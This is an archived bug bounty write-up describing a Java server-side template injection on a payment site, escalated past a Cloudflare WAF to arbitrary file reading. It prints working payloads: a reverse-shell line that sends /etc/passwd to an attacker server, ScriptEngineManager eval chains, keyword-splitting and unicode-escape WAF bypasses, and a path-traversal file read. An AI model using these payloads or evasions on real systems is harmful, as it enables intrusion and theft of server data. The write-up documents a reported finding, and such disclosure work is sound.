# Doing it the researcher’s way

- **Source URL:** https://medium.com/@jazdprince/doing-it-the-researchers-way-how-i-managed-to-get-ssti-server-side-template-injection-which-66b239ca0104?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20221222135308/https://medium.com/@jazdprince/doing-it-the-researchers-way-how-i-managed-to-get-ssti-server-side-template-injection-which-66b239ca0104
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1087 (id 1087)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Doing it the researcher’s way: How I Managed to Get SSTI (Server Side Template Injection) which lead to arbitrary file reading on One of the Leading Payment Systems in Asia

Hello everyone,

This is my first longer write-up about one of my discoveries made while bug hunting.

# Initial Foothold

I was browsing through a website which came to my notice was one of a leading payment system provider in Asia. So, I was checking on this and found that it had a weird issue on the parameter passing through it (Thanks to burpsuite :D ). It reflected what was send to the request parameter but with a twist :)

This is nothing but SSTI , which means the payload sending from the user end is getting injected onto the server and it executed the payload and shows the result of that particular payload if the payload we give is actually understandable by the server. Here in this case i provided **${7\*7}** which in turn on the response it was executed as 7\*7 which is 49 . That means it is vulnerable to Server side template injection (SSTI). You can read more on this from [here](/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68) or from [here](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti).

The response for the above request was like this:

At this point i had no idea where to start, so as usual i did the normal thing which is copy pasting all the SSTI payloads from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) and [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

Only a few worked, and I reported the bug immediately. But still, I felt something was missing from my end. After a while, the team replied, mentioning that if I could do anything to escalate the issue to critical or high severity, This piqued my interest, and I decided to learn more about the subject.

So I started to read some blogs and write-ups related to SSTI and Expression Language Injection, but none of them were successful. One thing which was sure was the application is using Java which is a simple and powerful language ;)

And one more challenge that I had to face was that the application was behind a Cloudflare firewall. So any payload I try to execute will eventually fail. So I thought to quit.

This is one of the payload which i tried and is blocked by the WAF :

*$%7btrue.getClass().forName(\%22Java.lang.Runtime\%22).getMethods()\[6\].invoke(true.getClass().forName(\%22Java.lang.Runtime\%22)).exec(\%27bash%20-c%20\%22cat%20/etc/passwd%20%3E%26%20/dev/tcp/\<ourserver>%200%3E%261%22%20%27%20)%7D*

# Getting into the track

The journey continued after the support which i got from my workplace team members , now i started to explore more on the topic and understand the language.

I started with reading some blogs related to expression language injection and found this amazing [blog](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html). In this blog it is mentioned that i can create a javascript instance using ScriptEngineManager and execute the java code using that.

I used the below payloads :

*${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance()}*

So to find out what kind of scriptengine it is using we can use — *${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’)}*

And for getting the language name and version —

*${‘b’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineFactories()\[0\].getLanguageName()}*

*${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineFactories()\[0\].getLanguageVersion()}*

I was excited at first since i got some results from the above requests.

But the real challenge came after using the payloads having the exec() or eval() since they are detected by the cloudflare as i mentioned earlier :(

This is a payload with eval function — *${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’).eval(\”new+java.lang.String(‘test’)\”)}*

So i thought this wont work i started again from the beginning and tried to get some sensitive information from the server.

I used the payload *${class.forName(“java.lang.System”).getProperty(“user.home”)}*

The response didn't contain anything. At that point i understood that it wont work this way , i need to use the same ScriptEngineManager technique to see the result.

# Bypassing WAF

So the only way to move forward is to bypass the WAF detection of certain functions. While i was testing the functions i tried to use the words **evaluate()** and **execute()** instead of **eval()** and **exec()** and i found out that it detects only the keywords eval and exec and not evaluate or execute. So i got to know i need something along with the keyword eval or exec and after some research i found [gbk encoding](https://www.fileformat.info/info/charset/GBK/encode.htm) technique.

So i used \u0028 replacing “(“ since i know that the language used is java.

So now my function changes to eval\u0028) and it worked. :D

So i used the below payload to get some sensitive information.

*${‘b’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘nashorn’).eval\u0028'java.lang.System.getProperty(“user.home”)’)}*

I got the application user’s home directory :D

Another thing i noticed is the WAF detected keywords like “runtime” and commands like “whoami”, “etc/passwd” etc.

So i decided to instead provide those keywords as “run”+”time” (concatenation method) and it worked :D

Now, I tried to look for RCE by combining all the above methods. So I used the same blog that I previously mentioned.

*test${‘b’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘js’).eval\u0028'java.lang.Run’+’time.getRuntime().exec\u0028"who”+”ami”).getInputStream()’).toString()}*

This means i got a unixprocess instance up. But it didn't execute anything. I tried to provide a reverse shell payload using the same way and it didn't work either :(

I was thinking hard and trying many methods to get a reverse shell, but all ended in vain. But still, I was happy at this point since I managed to bypass CloudFlare and get the internal directory for reporting to the team.

After some thoughts while driving my way back home from office on my bike i thought about “Why shouldn’t i try to fetch some sensitive information like etc/passwd through some java file reading techniques?”

I tried to research more on those methods to see if I could pull out or read sensitive files like that, and I found a way.

I can use ***java.nio.file.Files.readAllLines(java.nio.file.Paths.get(‘filepath’)).get(0)*** method to fetch sensitive files from the server and read it.

## Cloudflare detection

*${‘b’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘js’).eval\u0028'java.nio.file.Files.readAllLines(java.nio.file.Paths.get(“../../../../../etc/passwd”)).get(1)’)}*

## Cloudflare detection bypass

*${‘b’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘js’).eval\u0028'java.nio.file.Files.readAllLines(java.nio.file.Paths.get(“../../../../../et”+”c/passwd”)).get(1)’)}*

I was able to read server files using this method. At this point i was very excited and reported this to the team and they appreciated me and the bug was immediately rated as **Critical** :)

## Tips to improve bug hunting/research skill

1. Read , read , read. Try to read a lot on latest articles related to CVE or new technologies, if possible try to practice some labs related to that.
2. Try to take breaks in between. I know sometimes when we get into something we feel like to give up when there is no result, NEVER GIVE UP. Sometimes when you go for a ride you may get some new ideas :D
3. Try to research for possible programming code examples available if there is a code injection.

Thanks for reading this article. I hope that i could help you in some way :D

## **Special Mention**

I am very grateful to all my team members for their support during my bug hunting journey. Thanks a lot :D
